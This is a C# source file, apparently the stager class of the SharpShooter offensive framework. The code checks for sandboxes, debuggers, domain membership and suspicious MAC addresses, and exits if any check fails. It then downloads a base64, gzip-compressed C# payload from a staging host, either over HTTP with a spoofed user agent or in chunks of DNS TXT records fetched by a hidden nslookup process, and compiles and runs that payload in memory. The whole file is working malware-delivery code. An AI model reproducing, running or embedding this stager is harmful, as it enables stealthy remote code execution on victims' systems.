using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;



[ComVisible(true)]
public class SharpShooter
{
    public SharpShooter()
    {
    }

    public void CheckPlease(int check, string arg)
    {
        CheckPlease cp = new CheckPlease();
        switch(check)
        {
            case 0:
                if (!cp.isDomain(arg)) Environment.Exit(1);
                break;
            case 1:
                if (!cp.isDomainJoined()) Environment.Exit(1);
                break;
            case 2:
                if (cp.containsSandboxArtifacts()) Environment.Exit(1);
                break;
            case 3:
                if (cp.isBadMac()) Environment.Exit(1);
                break;
            case 4:
                if (cp.isDebugged()) Environment.Exit(1);
                break;

        }
    }

    public void Go(string RefStr, string NameSpace, string EntryPoint, int Technique, string StageHost)
    {
        SharpShooter ss = new SharpShooter();
        string[] Refs = RefStr.Split(",".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);

        try
        {
            // Attempt either web delivery (1), DNS delivery (2) or attempt both (3)
            switch (Technique)
            {
                case 1: // web
                    ss.Shoot(Refs, NameSpace, EntryPoint, true, StageHost);
                    break;
                case 2: // dns
                    ss.Shoot(Refs, NameSpace, EntryPoint, false, StageHost);
                    break;
            }
        }
        catch(Exception e)
        {
            //MessageBox.Show(e.Message);
            /*try
            {
                // if an error occurs, fall back to try DNS
                // extract the domain
                // e.g. URL of http://wwww.example.org/foo becomes example.org for DNS
                var uri = new Uri(StageHost);
                string Domain = uri.Host;
                ss.Shoot(Refs, NameSpace, EntryPoint, false, Domain);
            }
            catch { }*/
        }
    }

    private string AimWeb(string url)
    {
        WebClient client = new WebClient();
        // empty user agent is sometimes an indicator
        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
        client.UseDefaultCredentials = true;
        string EncodedScript = client.DownloadString(url);
        byte[] data = Convert.FromBase64String(EncodedScript);
        string decodedScript = Unzip(data);
        return decodedScript;
    }

    private string LookupDNS(string hostname)
    {
        // Modified version of:
        // http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
        string txtRecords = "";
        string block = "";
        string output;
        string pattern = string.Format(@"{0}\s*text =\s*([""])(.*?)([""])", hostname);
        string val = @"([""])(.*?)([""])";
        var startInfo = new ProcessStartInfo("nslookup");
        startInfo.Arguments = string.Format("-type=TXT -retry=3 -timeout=6 {0}", hostname);
        startInfo.RedirectStandardOutput = true;
        startInfo.RedirectStandardError = true;
        startInfo.UseShellExecute = false;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;

        using (var cmd = Process.Start(startInfo))
        {
            output = cmd.StandardOutput.ReadToEnd();
        }

        Match match = Regex.Match(output, pattern, RegexOptions.IgnoreCase);
        if (match.Success)
        {
            txtRecords = match.Groups[0].Value;
            Match m = Regex.Match(txtRecords, val, RegexOptions.IgnoreCase);
            block = m.Groups[0].Value;
        }
        return block.Replace(@"""", string.Empty);
    }

    private string AimDNS(string domain)
    {
        string block0 = LookupDNS("0." + domain);
        // Find the number of blocks from PowerDNS
        int count = Int32.Parse(block0.Substring(17, block0.IndexOf(";", 17) - 17));
        // Loop and retrieve every block to get a base64 copy of the script
        string EncodedScript = "";
        for (int i = 1; i <= count; i++)
            EncodedScript += LookupDNS(i + "." + domain);

        byte[] data = Convert.FromBase64String(EncodedScript);
        string decodedScript = Unzip(data);

        return decodedScript;
    }

    private void CopyTo(Stream src, Stream dest)
    {
        byte[] bytes = new byte[4096];

        int cnt;

        while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
        {
            dest.Write(bytes, 0, cnt);
        }
    }
    private string Unzip(byte[] bytes)
    {
        using (var msi = new MemoryStream(bytes))
        using (var mso = new MemoryStream())
        {
            using (var gs = new GZipStream(msi, CompressionMode.Decompress))
            {
                CopyTo(gs, mso);
            }

            return Encoding.UTF8.GetString(mso.ToArray());
        }
    }

    private void Shoot(string[] refs, string EntryPoint, string Method, bool technique, string stagerhost)
    {
        CheckPlease cp = new CheckPlease();

        Dictionary<string, string> compilerInfo = new Dictionary<string, string>();
        compilerInfo.Add("CompilerVersion", "v3.5");
        CSharpCodeProvider provider = new CSharpCodeProvider(compilerInfo);
        CompilerParameters parameters = new CompilerParameters();

        foreach (string r in refs)
            parameters.ReferencedAssemblies.Add(r);

        parameters.GenerateExecutable = false;
        parameters.GenerateInMemory = true;
        parameters.CompilerOptions = "/unsafe /platform:x86";
        // Try and enforce the local appdata temp folder - .cs file written here so need to avoid c:\windows\temp for UAC enforced
        String tmp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");
        parameters.TempFiles = new TempFileCollection(tmp, false);
        string code;
        // true = stage via web
        // false = stage via dns
        if (technique)
            code = AimWeb(stagerhost);
        else code = AimDNS(stagerhost);
        CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
        if (results.Errors.HasErrors)
        {
            StringBuilder sb = new StringBuilder();

            foreach (CompilerError error in results.Errors)
            {
                sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
            }

            throw new InvalidOperationException(sb.ToString());
        }
        Assembly assembly = results.CompiledAssembly;
        Type program = assembly.GetType(EntryPoint);
        MethodInfo main = program.GetMethod(Method);
        main.Invoke(null, null);
    }
}


